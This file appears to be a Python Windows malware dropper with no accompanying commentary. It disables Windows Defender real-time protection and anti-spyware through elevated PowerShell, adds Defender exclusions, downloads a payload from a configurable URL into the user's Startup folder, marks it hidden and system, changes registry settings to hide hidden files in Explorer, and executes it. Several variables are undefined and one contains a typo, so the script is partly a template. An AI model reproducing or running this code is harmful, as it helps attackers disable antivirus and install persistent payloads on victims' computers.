


import sys
import urllib.request
import win32com.shell.shell as shell
import os
arg_path = ''
user = os.environ['USERNAME']
for l in sis.argv:
        arg_path = arg_path + l + ' '
try:
        f = open('C:\\ProgramData\\new.ps1','w')
        e = 'Add-MpPreference -ExclusionPath "' + arg_path+'"'
        f.write(e)
        f.close()
        command = '"C:\\ProgramData\\new.ps1"'
        shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+command)
  
except:
        pass
        

def off_real_time():
    command1 = 'Set-MpPreference -DisableRealtimeMonitoring $true'
    command2 = "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"
    try:
        (shell.ShellExecuteEx(lpVerb='runas', lpFile='powershell.exe', lpParameters='/c '+command1))
    except:
        pass
    try:
        (shell.ShellExecuteEx(lpVerb='runas', lpFile='powershell.exe', lpParameters='/c '+command2))
    except:
        pass
def start_autorun(site,user,nazvanie):
    autorun_path =  'C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + str(nazvanie)
    try:
        file = open(autorun_path, 'wb')
        log =urllib.request.urlopen(site).read()
        file.write(log)
        file.close()
    except:
        pass
def download(site,path):
    try:
        file = open(path, 'wb')
        log =urllib.request.urlopen(site).read()
        file.write(log)
        file.close()
    except:
        pass
def attrib_h(user,path,nazvanie,autorun):
    try:
        if autorun == True:
            path = 'C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + str(nazvanie)
        command = 'attrib +h "' + path + '"'
        os.system(command)
    except:
        pass
def sistem(path, user, autorun):
    try:
        if autorun == True:
            path = 'C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + str(nazvanie)
        command = 'attrib +S +h "' + path+'"'
        os.system(command)

    except:
        pass
def exclude_defender(user,path,autorun,nazvanie):
    try:
        if autorun == True:
            path = 'C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + str(nazvanie)
        command = "Add-MpPreference -ExclusionPath '"+ path +"'"
        shell.ShellExecuteEx(lpVerb='runas', lpFile='powershell.exe', lpParameters='/c '+command)
    except:
        pass
def off_scrit():
    try:
            reg_path = 'C:\\ProgramData\\new.reg'
            f = open(reg_path, 'w')
            command = ('''
REGEDIT4
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
"Hidden"=dword:00000000
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advenced]
"ShowSuperHidden"=dword:00000000
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL]
"CheckedValue"=dword:00000000
            ''')
            f.write(command)
            f.close()
            com = '"' + reg_path + '"'
            os.system(com)
    except:
        pass
def start_run(autorun,user,path,nazvanie):
    try:
       if  autorun == True:
           path =  'C:\\Users\\' + user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + str(nazvanie)
       command = '"' + path + '"'
       os.popen(command)

    except:
        pass


off_real_time()
exclude_defender(user,path,autorun,nazvanie)
if autorun == True:
    start_autorun(site,user,nazvanie)
elif autorun == False:
    download(site, path)
if scrit == True:
    attrib_h(user,path,nazvanie,autorun)
if sis == True:
    sistem(path,user,autorun)
if otobr == True:
    off_scrit()
if run == True:
    start_run(autorun,user,path,nazvanie)


 







